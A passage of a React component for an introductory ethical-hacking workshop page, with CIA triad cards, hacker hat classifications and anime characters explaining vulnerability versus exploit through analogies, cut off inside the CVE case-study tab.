import React, { useState } from 'react';
import kakashiImg from '../assets/kakashi.jpg';
import uraharaImg from '../assets/urahara.jpg';
import rayleighImg from '../assets/rayleigh.jpg';

// Web audio chime for sensei interactions
const playSenseiChime = (pitch = 600) => {
  try {
    const ctx = new (window.AudioContext || window.webkitAudioContext)();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.frequency.setValueAtTime(pitch, ctx.currentTime);
    osc.frequency.exponentialRampToValueAtTime(pitch * 1.5, ctx.currentTime + 0.15);
    gain.gain.setValueAtTime(0.08, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.18);
    osc.start();
    osc.stop(ctx.currentTime + 0.2);
  } catch {
    // Ignore audio fail on strict browser security
  }
};

const SENSEIS = {
  kakashi: {
    id: 'kakashi',
    name: 'Kakashi Hatake',
    title: 'The Copy Ninja (6th Hokage / Special Jōnin)',
    anime: 'Naruto Shippuden',
    avatar: kakashiImg,
    themeColor: '#ff9d00',
    quoteColor: 'var(--accent-orange)',
    badge: 'SHINOBI MASTER // 1,000 JUTSU',
    greeting: "Yo! Genin, welcome to my Shinobi Cyber Briefing. In the field, mixing up a 'Vulnerability' with an 'Exploit' will get your whole squad ambushed. Let me break it down simply so you never forget it on the battlefield...",
    vulnConcept: "In the ninja world, imagine the Great Stone Wall of the Hidden Leaf Village. If an earth tremor leaves an unpatched crack in the perimeter barrier seal, that crack is a Vulnerability. It sits there completely silent. It harms no one by itself. But if someone discovers it, the village perimeter is exposed!",
    vulnAnalogyTitle: 'The Unpatched Konoha Barrier Crack',
    vulnAnalogyBody: 'The flaw exists silently. Nobody has stepped through it yet, but it creates the potential for catastrophic breach.',
    vulnKeyPoints: [
      'Tracked globally by CVE IDs (e.g. CVE-2021-44228)',
      'Severity rated via CVSS Scores from 0.0 (None) to 10.0 (Critical)',
      'Common causes: Buffer overflows in C/C++, missing authentication checks, unpatched services',
      'Shinobi Analogy: Leaving an unlocked window in the Hokage mansion while out on a mission'
    ],
    exploitConcept: "Now enter an enemy rogue ninja. They spend days observing the barrier, notice that unpatched crack, and invent a custom Earth-Style Infiltration Jutsu specifically shaped to slip through that exact fissure and disable the alarms. THAT crafted jutsu is the Exploit!",
    exploitAnalogyTitle: "The Rogue Ninja's Infiltration Jutsu",
    exploitAnalogyBody: 'The active weapon engineered to strike the flaw. Without the crack, the jutsu fails; without the jutsu, the crack is just an unthreatened gap.',
    exploitKeyPoints: [
      'Actions: Spawns reverse shells, exfiltrates data, escalates to Root (UID 0), or crashes systems (DoS)',
      'Zero-Day Exploit: An attack technique targeting a flaw unknown to the developer, with 0 days of patch availability',
      'PoC vs Weaponized: Proof-of-Concept only confirms the crack exists; weaponized delivers the lethal payload',
      'Shinobi Analogy: The burglar bringing a custom ladder engineered specifically to climb through that unlocked window'
    ],
    lifecycle: [
      { step: '1. VULNERABILITY (The Flaw)', desc: 'A ninja engineer leaves an unsealed gap in the village barrier (unbounded memory buffer or insecure logic).' },
      { step: '2. EXPLOIT (The Weapon)', desc: 'An infiltrator designs a mud-burrowing jutsu shaped to breach that unsealed gap (crafted packet payload).' },
      { step: '3. PAYLOAD (The Impact)', desc: 'The jutsu triggers, detonating explosive tags inside the shinobi armory (remote code execution / root shell).' },
      { step: '4. MITIGATION (The Patch)', desc: 'The Hokage orders Anbu to scribe the Five-Pronged Iron Seal, permanently sealing the gap (software patch / WAF rule).' }
    ]
  },
  urahara: {
    id: 'urahara',
    name: 'Kisuke Urahara',
    title: 'Former Captain of Squad 12 & Shinigami R&D Mastermind',
    anime: 'Bleach',
    avatar: uraharaImg,
    themeColor: '#00f0ff',
    quoteColor: 'var(--accent-cyan)',
    badge: 'SHINIGAMI R&D // GOTEI 13 SCIENTIST',
    greeting: "Oya oya~ Welcome to my humble Candy Shop! In spiritual combat, failing to distinguish between a passive defect and an active Kidō strike can cost you your spiritual soul. Allow me to elucidate with Soul Society precision...",
    vulnConcept: "A Vulnerability is like a micro-fissure in the Sekiseki spiritual stone wall of the Seireitei. The stone masonry has a natural structural impurity where spirit particles leak. By itself, it is completely passive—it causes no explosions and harms nobody until an intruder detects it!",
    vulnAnalogyTitle: 'The Micro-Fissure in the Sekiseki Spiritual Stone Wall',
    vulnAnalogyBody: 'A passive flaw or structural bug in the spiritual architecture waiting to be uncovered.',
    vulnKeyPoints: [
      'Documented as a passive software bug or architectural oversight',
      'Quantified via CVSS (Common Vulnerability Scoring System) 0.0 - 10.0',
      'Root causes: Unvalidated user inputs (SQLi, XSS), default admin credentials, memory leaks',
      'Spiritual Analogy: A crack in the Senkaimon gate\'s containment field'
    ],
    exploitConcept: "An Exploit is the specialized Kidō spell engineered by Aizen or Mayuri to trigger that micro-fissure. They calculate the exact vibrational frequency and fire a concentrated blast of black spiritual particles into the fissure, collapsing the entire barrier wall. That crafted spell is the Exploit!",
    exploitAnalogyTitle: 'The Custom-Resonant Kidō Infiltration Spell',
    exploitAnalogyBody: 'The weaponized payload designed to trigger unintended collapse by abusing the specific micro-fissure.',
    exploitKeyPoints: [
      'Transforms a passive bug into an active hostile takeover',
      'Weaponized zero-days sell for millions in dark web exploit markets',
      'Executes arbitrary shellcode inside the target\'s address space',
      'Spiritual Analogy: The custom Kidō incantation tuned precisely to detonate that micro-fissure'
    ],
    lifecycle: [
      { step: '1. VULNERABILITY (The Flaw)', desc: 'A spiritual gate protocol is compiled without boundary checks on spirit particle density.' },
      { step: '2. EXPLOIT (The Weapon)', desc: 'A rogue soul reaper transmits a malicious data stream exceeding the gate\'s maximum buffer.' },
      { step: '3. PAYLOAD (The Impact)', desc: 'The gate opens a reverse backdoor into Central 46 archives, allowing unauthorized privilege escalation.' },
      { step: '4. MITIGATION (The Patch)', desc: 'Squad 12 deploys a cryptographic spiritual talisman that inspects and rejects oversized packets.' }
    ]
  },
  rayleigh: {
    id: 'rayleigh',
    name: 'Silvers Rayleigh',
    title: 'The Dark King (First Mate of the Roger Pirates)',
    anime: 'One Piece',
    avatar: rayleighImg,
    themeColor: '#ff2a5f',
    quoteColor: 'var(--accent-red)',
    badge: 'DARK KING // ADVANCED CONQUEROR HAKI',
    greeting: "Hahaha! Young pirate, navigating the New World requires knowing your own ship's rotten timber from the enemy's cannon fire. Pay close attention to this distinction if you want to survive the Grand Line...",
    vulnConcept: "Look down at the wooden hull of your pirate galleon below the waterline. If sea termites rot a section of timber, that soft, spongy plank is a Vulnerability. While the seas are calm, you float safely and nothing happens. But that passive weakness is sitting there waiting for impact!",
    vulnAnalogyTitle: "The Rotten Timber Plank Beneath the Waterline",
    vulnAnalogyBody: 'A passive weakness. It won\'t sink you on a calm day, but leaves your vessel defenseless against targeted impact.',
    vulnKeyPoints: [
      'A passive weakness in software, hardware, or network architecture',
      'Cataloged globally by MITRE and NIST as unique CVE identifiers',
      'Examples: Unencrypted HTTP credentials, buffer overflows, missing WPA3 PMF',
      'Pirate Analogy: The rotten timber plank waiting below the waterline'
    ],
    exploitConcept: "Now an enemy Marine warship pulls alongside you. The admiral spots that rotted plank through his spyglass and loads a specialized iron-spiked chained cannonball aimed straight at that soft timber. The cannonball and the firing calculation is the Exploit!",
    exploitAnalogyTitle: "The Marine Admiral's Armor-Piercing Chained Cannonball",
    exploitAnalogyBody: 'The weaponized tool taking active advantage of the rotted spot to punch through and flood the hull.',
    exploitKeyPoints: [
      'The active projectile designed to shatter through the vulnerability',
      'Can deliver weaponized payloads like ransomware, keyloggers, or reverse shells',
      'Without the rotten plank, the cannonball might bounce off; without the cannonball, the hull holds',
      'Pirate Analogy: The Marine\'s armor-piercing chained shot aimed directly at the rotten wood'
    ],
    lifecycle: [
      { step: '1. VULNERABILITY (The Flaw)', desc: 'A shipbuilder uses substandard unseasoned timber without protective tar coating (insecure code).' },
      { step: '2. EXPLOIT (The Weapon)', desc: 'Enemy gunners calibrate armor-piercing artillery to hit that exact coordinates (exploit payload).' },
      { step: '3. PAYLOAD (The Impact)', desc: 'The shot breaches the hull, flooding the gunpowder hold and sinking the vessel (RCE / DoS).' },
      { step: '4. MITIGATION (The Patch)', desc: 'The crew coats the hull in Busoshoku Armament Haki and iron plating, deflecting future shots (WPA3 / Patch).' }
    ]
  }
};

export default function Intro() {
  const [activeHat, setActiveHat] = useState('white');
  const [activeSenseiKey, setActiveSenseiKey] = useState('kakashi');
  const [activeLessonTab, setActiveLessonTab] = useState('comparison'); // 'comparison', 'lifecycle', 'cve', 'quiz'
  const [quizSelection, setQuizSelection] = useState(null);
  const [flippedCards, setFlippedCards] = useState({
    c: false,
    i: false,
    a: false
  });

  const currentSensei = SENSEIS[activeSenseiKey];

  const toggleCard = (card) => {
    setFlippedCards(prev => ({
      ...prev,
      [card]: !prev[card]
    }));
  };

  const handleSenseiSwitch = (key) => {
    setActiveSenseiKey(key);
    playSenseiChime(700);
  };

  const handleTabSwitch = (tab) => {
    setActiveLessonTab(tab);
    playSenseiChime(550);
  };

  const handleQuizAnswer = (ans) => {
    setQuizSelection(ans);
    playSenseiChime(ans === 'vuln' ? 880 : 320);
  };

  const hats = {
    white: {
      title: 'White Hat (Ethical Hacker)',
      color: 'var(--accent-green)',
      glow: 'var(--glow-green)',
      legal: 'Authorized & Legal',
      desc: 'Security specialists who use their skills for defensive purposes. They help organizations find vulnerabilities, conduct penetration tests, and secure systems with full consent and explicit written authorization.',
      examples: ['Vulnerability assessments', 'Penetration testing with contracts', 'Bug bounty hunting (VDP)', 'Securing network architectures']
    },
    grey: {
      title: 'Grey Hat (Semi-Authorized)',
      color: 'var(--accent-orange)',
      glow: 'var(--glow-orange)',
      legal: 'Ambiguous / Unauthorized (Sometimes illegal, but not malicious)',
      desc: 'Hackers who work without malicious intent but may violate laws or ethical standards. They might scan a system for bugs without permission and then report it to the owner, sometimes requesting a fee or publicizing the bug if ignored.',
      examples: ['Scanning public systems without explicit approval', 'Privately reporting bugs found unauthorized', 'Developing exploits for research but not sharing with criminals']
    },
    black: {
      title: 'Black Hat (Cybercriminal)',
      color: 'var(--accent-red)',
      glow: 'var(--glow-red)',
      legal: 'Illegal & Malicious',
      desc: 'Individuals who breach security networks with malicious intent. They steal sensitive data, deploy ransomware, sabotage digital infrastructure, or extort victims for personal financial gain, acting completely outside the law.',
      examples: ['Ransomware deployment', 'Data theft and corporate espionage', 'Distributed Denial of Service (DDoS) for extortion', 'Selling zero-days on the dark web']
    }
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: '30px' }}>
      <div>
        <span className="sidebar-tag">SESSION 1 & 2</span>
        <h1 className="text-cyber-glow" style={{ fontSize: '2rem', marginTop: '10px' }}>Cybersecurity & Ethical Hacking Fundamentals</h1>
        <p style={{ color: 'var(--text-secondary)', marginTop: '8px', lineHeight: '1.6' }}>
          Welcome to the CSEH Workshop. Before deploying tools or writing code, every security engineer must master the foundational concepts of information security and the boundaries of ethical engagement.
        </p>
      </div>

      {/* CIA Triad Section */}
      <section className="glass-panel" style={{ padding: '24px' }}>
        <h2 className="text-cyber-glow" style={{ fontSize: '1.25rem', marginBottom: '10px', display: 'flex', alignItems: 'center', gap: '8px' }}>
          <span>🛡️</span> The CIA Triad
        </h2>
        <p style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', marginBottom: '20px' }}>
          The ultimate goal of security operations is to maintain the three pillars of data protection. Click the cards below to investigate how each pillar is defined and preserved.
        </p>

        <div className="cia-grid">
          {/* Confidentiality Card */}
          <div className={`cia-card ${flippedCards.c ? 'flipped' : ''}`} onClick={() => toggleCard('c')} id="card-confidentiality">
            <div className="cia-card-inner">
              <div className="cia-card-front">
                <span style={{ fontSize: '2.5rem', marginBottom: '12px' }}>🔒</span>
                <h3>Confidentiality</h3>
                <span style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginTop: '12px', textTransform: 'uppercase' }}>Click to decrypt</span>
              </div>
              <div className="cia-card-back">
                <h4 style={{ color: 'var(--accent-cyan)', marginBottom: '8px' }}>Confidentiality</h4>
                <p style={{ marginBottom: '12px', fontSize: '0.85rem' }}>Ensuring that sensitive information is accessible only to authorized individuals. Prevents data leaks and eavesdropping.</p>
                <div style={{ background: 'rgba(0,0,0,0.3)', padding: '8px', borderRadius: '4px', fontFamily: 'var(--font-mono)', fontSize: '0.75rem' }}>
                  <span style={{ color: 'var(--accent-green)' }}>[ENCRYPTED]:</span> 0x8F9A4D...<br/>
                  <span style={{ color: 'var(--accent-cyan)' }}>[MECHANISM]:</span> AES-256 / RSA
                </div>
              </div>
            </div>
          </div>

          {/* Integrity Card */}
          <div className={`cia-card ${flippedCards.i ? 'flipped' : ''}`} onClick={() => toggleCard('i')} id="card-integrity">
            <div className="cia-card-inner">
              <div className="cia-card-front">
                <span style={{ fontSize: '2.5rem', marginBottom: '12px' }}>🛡️</span>
                <h3>Integrity</h3>
                <span style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginTop: '12px', textTransform: 'uppercase' }}>Click to verify</span>
              </div>
              <div className="cia-card-back">
                <h4 style={{ color: 'var(--accent-cyan)', marginBottom: '8px' }}>Integrity</h4>
                <p style={{ marginBottom: '12px', fontSize: '0.85rem' }}>Guaranteeing that data remains trustworthy, accurate, and unaltered by unauthorized parties during storage or transmission.</p>
                <div style={{ background: 'rgba(0,0,0,0.3)', padding: '8px', borderRadius: '4px', fontFamily: 'var(--font-mono)', fontSize: '0.75rem' }}>
                  <span style={{ color: 'var(--accent-green)' }}>[SHA-256]:</span> f1e9e8c4...<br/>
                  <span style={{ color: 'var(--accent-cyan)' }}>[MECHANISM]:</span> Hashes & Signatures
                </div>
              </div>
            </div>
          </div>

          {/* Availability Card */}
          <div className={`cia-card ${flippedCards.a ? 'flipped' : ''}`} onClick={() => toggleCard('a')} id="card-availability">
            <div className="cia-card-inner">
              <div className="cia-card-front">
                <span style={{ fontSize: '2.5rem', marginBottom: '12px' }}>⚡</span>
                <h3>Availability</h3>
                <span style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', marginTop: '12px', textTransform: 'uppercase' }}>Click to power</span>
              </div>
              <div className="cia-card-back">
                <h4 style={{ color: 'var(--accent-cyan)', marginBottom: '8px' }}>Availability</h4>
                <p style={{ marginBottom: '12px', fontSize: '0.85rem' }}>Assuring that authorized users have prompt, uninterrupted access to systems, networks, and data when needed.</p>
                <div style={{ background: 'rgba(0,0,0,0.3)', padding: '8px', borderRadius: '4px', fontFamily: 'var(--font-mono)', fontSize: '0.75rem' }}>
                  <span style={{ color: 'var(--accent-green)' }}>[UPTIME]:</span> 99.999% Active<br/>
                  <span style={{ color: 'var(--accent-cyan)' }}>[MECHANISM]:</span> Load Balancers / Redundancy
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* Hacker Classification Section */}
      <section className="glass-panel" style={{ padding: '24px' }}>
        <h2 className="text-cyber-glow" style={{ fontSize: '1.25rem', marginBottom: '10px' }}>
          🕵️ Hacker Hat Classifications
        </h2>
        <p style={{ color: 'var(--text-secondary)', fontSize: '0.9rem', marginBottom: '20px' }}>
          Not all hackers have the same objectives. Select the hats below to explore their legal statuses and operational motivations.
        </p>

        <div style={{ display: 'flex', gap: '10px', marginBottom: '20px', flexWrap: 'wrap' }}>
          <button 
            id="btn-hat-white"
            onClick={() => setActiveHat('white')}
            className={`cyber-button green ${activeHat === 'white' ? '' : 'disabled'}`}
            style={{ flex: 1, minWidth: '120px' }}
          >
            🟢 White Hat
          </button>
          <button 
            id="btn-hat-grey"
            onClick={() => setActiveHat('grey')}
            className={`cyber-button orange ${activeHat === 'grey' ? '' : 'disabled'}`}
            style={{ flex: 1, minWidth: '120px' }}
          >
            🟡 Grey Hat
          </button>
          <button 
            id="btn-hat-black"
            onClick={() => setActiveHat('black')}
            className={`cyber-button red ${activeHat === 'black' ? '' : 'disabled'}`}
            style={{ flex: 1, minWidth: '120px' }}
          >
            🔴 Black Hat
          </button>
        </div>

        <div 
          style={{ 
            background: 'rgba(9, 13, 23, 0.6)', 
            border: `1px solid ${hats[activeHat].color}`, 
            boxShadow: hats[activeHat].glow,
            borderRadius: '8px', 
            padding: '20px',
            transition: 'all 0.3s ease'
          }}
        >
          <h3 style={{ color: hats[activeHat].color, marginBottom: '6px' }}>{hats[activeHat].title}</h3>
          <div style={{ display: 'inline-block', fontSize: '0.75rem', fontFamily: 'var(--font-mono)', background: 'rgba(255,255,255,0.06)', padding: '2px 8px', borderRadius: '4px', marginBottom: '16px', border: `1px solid rgba(255,255,255,0.1)` }}>
            STATUS: <span style={{ fontWeight: 'bold' }}>{hats[activeHat].legal}</span>
          </div>
          
          <p style={{ fontSize: '0.95rem', lineHeight: '1.6', marginBottom: '16px', color: 'var(--text-primary)' }}>
            {hats[activeHat].desc}
          </p>

          <h4 style={{ fontSize: '0.85rem', textTransform: 'uppercase', color: 'var(--text-secondary)', letterSpacing: '1px', marginBottom: '10px' }}>Typical Actions</h4>
          <ul style={{ paddingLeft: '20px', display: 'flex', flexDirection: 'column', gap: '8px', fontSize: '0.9rem', color: 'var(--text-secondary)' }}>
            {hats[activeHat].examples.map((ex, i) => (
              <li key={i}><span style={{ color: hats[activeHat].color }}>⚡</span> {ex}</li>
            ))}
          </ul>
        </div>
      </section>

      {/* --- ANIME SENSEI MASTERCLASS: VULNERABILITY VS EXPLOIT --- */}
      <section className="sensei-stage" style={{ padding: '26px', borderColor: currentSensei.themeColor }}>
        {/* Sensei Selector Bar */}
        <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', flexWrap: 'wrap', gap: '14px', marginBottom: '20px' }}>
          <div>
            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
              <span className="sidebar-tag" style={{ background: `${currentSensei.themeColor}22`, borderColor: currentSensei.themeColor, color: currentSensei.themeColor }}>
                ⚔️ ANIME SENSEI MASTERCLASS
              </span>
              <span style={{ fontSize: '0.72rem', fontFamily: 'var(--font-mono)', color: 'var(--text-secondary)' }}>
                SELECT YOUR INSTRUCTOR:
              </span>
            </div>
            <h2 className="text-cyber-glow" style={{ fontSize: '1.4rem', marginTop: '6px' }}>
              ⚡ What is a Vulnerability vs an Exploit?
            </h2>
          </div>

          {/* Sensei Switcher Buttons */}
          <div style={{ display: 'flex', gap: '8px', flexWrap: 'wrap' }}>
            {Object.keys(SENSEIS).map((key) => {
              const s = SENSEIS[key];
              const isSelected = activeSenseiKey === key;
              return (
                <button
                  key={key}
                  onClick={() => handleSenseiSwitch(key)}
                  className="cyber-button"
                  style={{
                    display: 'flex',
                    alignItems: 'center',
                    gap: '8px',
                    padding: '6px 14px',
                    fontSize: '0.8rem',
                    borderColor: isSelected ? s.themeColor : 'rgba(255,255,255,0.15)',
                    background: isSelected ? `${s.themeColor}25` : 'rgba(0,0,0,0.4)',
                    color: isSelected ? s.themeColor : 'var(--text-secondary)',
                    boxShadow: isSelected ? `0 0 12px ${s.themeColor}44` : 'none'
                  }}
                >
                  <img
                    src={s.avatar}
                    alt={s.name}
                    style={{ width: '22px', height: '22px', borderRadius: '50%', objectFit: 'cover' }}
                  />
                  <span>{key === 'kakashi' ? '🍥 Kakashi' : (key === 'urahara' ? '⚔️ Urahara' : '🏴‍☠️ Rayleigh')}</span>
                </button>
              );
            })}
          </div>
        </div>

        {/* Sensei Visual Novel Stage: Character Avatar + Live Speech Bubble */}
        <div style={{ display: 'flex', gap: '20px', alignItems: 'center', flexWrap: 'wrap', marginBottom: '24px' }}>
          {/* Character Avatar with Glowing Aura */}
          <div className="sensei-avatar-frame pulse-aura" style={{ borderColor: currentSensei.themeColor, boxShadow: `0 0 25px ${currentSensei.themeColor}66` }}>
            <img src={currentSensei.avatar} alt={currentSensei.name} />
          </div>

          {/* Interactive Speech Box */}
          <div className="sensei-dialogue-box" style={{ borderLeftColor: currentSensei.themeColor }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '6px' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
                <strong style={{ color: currentSensei.themeColor, fontSize: '1rem' }}>{currentSensei.name}</strong>
                <span style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', fontFamily: 'var(--font-mono)' }}>
                  ({currentSensei.anime})
                </span>
              </div>
              <span className="sensei-tag-badge" style={{ background: `${currentSensei.themeColor}22`, color: currentSensei.themeColor, border: `1px solid ${currentSensei.themeColor}44` }}>
                {currentSensei.badge}
              </span>
            </div>

            <div style={{ fontStyle: 'italic', color: '#e6effa', fontSize: '0.92rem', lineHeight: '1.6', textShadow: '0 0 8px rgba(0,0,0,0.6)' }}>
              "{currentSensei.greeting}"
            </div>

            <div style={{ display: 'flex', gap: '10px', marginTop: '12px', flexWrap: 'wrap' }}>
              <span style={{ fontSize: '0.7rem', fontFamily: 'var(--font-mono)', color: 'var(--text-secondary)' }}>
                VOICE: <span style={{ color: currentSensei.themeColor }}>JAPANESE AUDIO READY</span>
              </span>
              <span style={{ fontSize: '0.7rem', fontFamily: 'var(--font-mono)', color: 'var(--text-secondary)' }}>
                PEDAGOGY: <span style={{ color: 'var(--accent-cyan)' }}>SHONEN BATTLE LOGIC</span>
              </span>
            </div>
          </div>
        </div>

        {/* Sensei's Lesson Navigation Tabs */}
        <div style={{ display: 'flex', gap: '8px', borderBottom: '1px solid rgba(255,255,255,0.1)', paddingBottom: '10px', marginBottom: '20px', flexWrap: 'wrap' }}>
          <button
            onClick={() => handleTabSwitch('comparison')}
            className="cyber-button"
            style={{
              fontSize: '0.8rem',
              padding: '6px 14px',
              borderColor: activeLessonTab === 'comparison' ? currentSensei.themeColor : 'transparent',
              color: activeLessonTab === 'comparison' ? currentSensei.themeColor : 'var(--text-secondary)',
              background: activeLessonTab === 'comparison' ? 'rgba(255,255,255,0.06)' : 'transparent'
            }}
          >
            📜 Sensei's Core Rule (Flaw vs Weapon)
          </button>
          <button
            onClick={() => handleTabSwitch('lifecycle')}
            className="cyber-button"
            style={{
              fontSize: '0.8rem',
              padding: '6px 14px',
              borderColor: activeLessonTab === 'lifecycle' ? currentSensei.themeColor : 'transparent',
              color: activeLessonTab === 'lifecycle' ? currentSensei.themeColor : 'var(--text-secondary)',
              background: activeLessonTab === 'lifecycle' ? 'rgba(255,255,255,0.06)' : 'transparent'
            }}
          >
            🔄 The 4-Stage Jutsu Lifecycle
          </button>
          <button
            onClick={() => handleTabSwitch('cve')}
            className="cyber-button"
            style={{
              fontSize: '0.8rem',
              padding: '6px 14px',
              borderColor: activeLessonTab === 'cve' ? currentSensei.themeColor : 'transparent',
              color: activeLessonTab === 'cve' ? currentSensei.themeColor : 'var(--text-secondary)',
              background: activeLessonTab === 'cve' ? 'rgba(255,255,255,0.06)' : 'transparent'
            }}
          >
            🥷 Shinobi Mission Archives (CVEs)
          </button>
          <button
            onClick={() => handleTabSwitch('quiz')}
            className="cyber-button"
            style={{
              fontSize: '0.8rem',
              padding: '6px 14px',
              borderColor: activeLessonTab === 'quiz' ? currentSensei.themeColor : 'transparent',
              color: activeLessonTab === 'quiz' ? currentSensei.themeColor : 'var(--text-secondary)',
              background: activeLessonTab === 'quiz' ? 'rgba(255,255,255,0.06)' : 'transparent'
            }}
          >
            🎯 Sensei's Pop Quiz
          </button>
        </div>

        {/* TAB 1: SENSEI'S CORE COMPARISON (FLAW VS WEAPON) */}
        {activeLessonTab === 'comparison' && (
          <div className="grid-2" style={{ gap: '20px' }}>
            {/* Card 1: Vulnerability explained by Anime Character */}
            <div className="scroll-card" style={{ border: '1px solid rgba(255, 157, 0, 0.4)' }}>
              <div style={{ position: 'absolute', top: 0, right: 0, background: 'var(--accent-orange)', color: '#000', fontWeight: 'bold', fontSize: '0.65rem', padding: '3px 10px', borderBottomLeftRadius: '6px', fontFamily: 'var(--font-mono)' }}>
                THE PASSIVE FLAW
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
                <span style={{ fontSize: '1.8rem' }}>🔓</span>
                <div>
                  <h3 style={{ color: 'var(--accent-orange)', fontSize: '1.15rem' }}>1. Vulnerability</h3>
                  <span style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', fontFamily: 'var(--font-mono)' }}>A weakness, defect or security loophole</span>
                </div>
              </div>

              {/* Sensei's Personal Voice Callout */}
              <div style={{ background: 'rgba(255, 157, 0, 0.08)', borderLeft: '3px solid var(--accent-orange)', padding: '12px 14px', borderRadius: '4px', marginBottom: '14px', fontSize: '0.85rem', color: '#ffdeaa', lineHeight: '1.5' }}>
                <strong style={{ color: 'var(--accent-orange)' }}>{currentSensei.name}'s Breakdown:</strong> "{currentSensei.vulnConcept}"
              </div>

              <div style={{ background: 'rgba(0,0,0,0.35)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '6px', padding: '12px', fontSize: '0.8rem' }}>
                <div style={{ color: 'var(--accent-orange)', fontWeight: 'bold', marginBottom: '6px', fontFamily: 'var(--font-mono)' }}>🔑 Technical Specifications:</div>
                <ul style={{ paddingLeft: '16px', color: 'var(--text-secondary)', display: 'flex', flexDirection: 'column', gap: '5px' }}>
                  {currentSensei.vulnKeyPoints.map((pt, idx) => (
                    <li key={idx}>{pt}</li>
                  ))}
                </ul>
              </div>

              <div style={{ marginTop: '12px', padding: '8px 12px', background: 'rgba(255,255,255,0.03)', borderRadius: '6px', fontSize: '0.76rem', color: 'var(--text-secondary)', border: '1px dashed rgba(255, 157, 0, 0.3)' }}>
                <strong style={{ color: 'var(--accent-orange)' }}>🥋 Sensei Analogy:</strong> {currentSensei.vulnAnalogyTitle} — {currentSensei.vulnAnalogyBody}
              </div>
            </div>

            {/* Card 2: Exploit explained by Anime Character */}
            <div className="scroll-card" style={{ border: '1px solid rgba(255, 42, 95, 0.4)' }}>
              <div style={{ position: 'absolute', top: 0, right: 0, background: 'var(--accent-red)', color: '#fff', fontWeight: 'bold', fontSize: '0.65rem', padding: '3px 10px', borderBottomLeftRadius: '6px', fontFamily: 'var(--font-mono)' }}>
                THE ACTIVE WEAPON
              </div>
              <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
                <span style={{ fontSize: '1.8rem' }}>💥</span>
                <div>
                  <h3 style={{ color: 'var(--accent-red)', fontSize: '1.15rem' }}>2. Exploit</h3>
                  <span style={{ fontSize: '0.75rem', color: 'var(--text-secondary)', fontFamily: 'var(--font-mono)' }}>The crafted tool striking the flaw</span>
                </div>
              </div>

              {/* Sensei's Personal Voice Callout */}
              <div style={{ background: 'rgba(255, 42, 95, 0.08)', borderLeft: '3px solid var(--accent-red)', padding: '12px 14px', borderRadius: '4px', marginBottom: '14px', fontSize: '0.85rem', color: '#ffb3c1', lineHeight: '1.5' }}>
                <strong style={{ color: 'var(--accent-red)' }}>{currentSensei.name}'s Breakdown:</strong> "{currentSensei.exploitConcept}"
              </div>

              <div style={{ background: 'rgba(0,0,0,0.35)', border: '1px solid rgba(255,255,255,0.06)', borderRadius: '6px', padding: '12px', fontSize: '0.8rem' }}>
                <div style={{ color: 'var(--accent-red)', fontWeight: 'bold', marginBottom: '6px', fontFamily: 'var(--font-mono)' }}>🔑 Technical Specifications:</div>
                <ul style={{ paddingLeft: '16px', color: 'var(--text-secondary)', display: 'flex', flexDirection: 'column', gap: '5px' }}>
                  {currentSensei.exploitKeyPoints.map((pt, idx) => (
                    <li key={idx}>{pt}</li>
                  ))}
                </ul>
              </div>

              <div style={{ marginTop: '12px', padding: '8px 12px', background: 'rgba(255,255,255,0.03)', borderRadius: '6px', fontSize: '0.76rem', color: 'var(--text-secondary)', border: '1px dashed rgba(255, 42, 95, 0.3)' }}>
                <strong style={{ color: 'var(--accent-red)' }}>🥋 Sensei Analogy:</strong> {currentSensei.exploitAnalogyTitle} — {currentSensei.exploitAnalogyBody}
              </div>
            </div>
          </div>
        )}

        {/* TAB 2: THE 4-STAGE JUTSU LIFECYCLE */}
        {activeLessonTab === 'lifecycle' && (
          <div style={{ background: 'rgba(0,0,0,0.35)', border: '1px solid var(--border-color)', borderRadius: '8px', padding: '20px' }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: '14px' }}>
              <h3 style={{ fontSize: '1.05rem', color: currentSensei.themeColor, display: 'flex', alignItems: 'center', gap: '8px' }}>
                <span>🔄</span> {currentSensei.name}'s 4-Stage Attack Lifecycle
              </h3>
              <span style={{ fontSize: '0.72rem', color: 'var(--text-secondary)', fontFamily: 'var(--font-mono)' }}>
                FROM FLAW TO REMEDIATION
              </span>
            </div>

            <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: '14px' }}>
              {currentSensei.lifecycle.map((stage, idx) => {
                const colors = ['var(--accent-cyan)', 'var(--accent-orange)', 'var(--accent-red)', 'var(--accent-green)'];
                return (
                  <div key={idx} style={{ background: 'rgba(255,255,255,0.02)', border: `1px solid ${colors[idx]}44`, borderRadius: '6px', padding: '14px' }}>
                    <div style={{ color: colors[idx], fontFamily: 'var(--font-mono)', fontSize: '0.8rem', fontWeight: 'bold' }}>
                      {stage.step}
                    </div>
                    <p style={{ color: 'var(--text-secondary)', fontSize: '0.78rem', marginTop: '6px', lineHeight: '1.4' }}>
                      {stage.desc}
                    </p>
                  </div>
                );
              })}
            </div>
          </div>
        )}

        {/* TAB 3: SHINOBI MISSION ARCHIVES (CVE CASE STUDIES) */}
        {activeLessonTab === 'cve' && (
          <div>
            <div style={{ marginBottom: '14px', display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <h4 style={{ fontSize: '0.95rem', color: 'var(--text-primary)', textTransform: 'uppercase', letterSpacing: '0.5px' }}>
                🥷 {currentSensei.name}'s Tactical Mission Debriefs (Real-World CVEs):
              </h4>
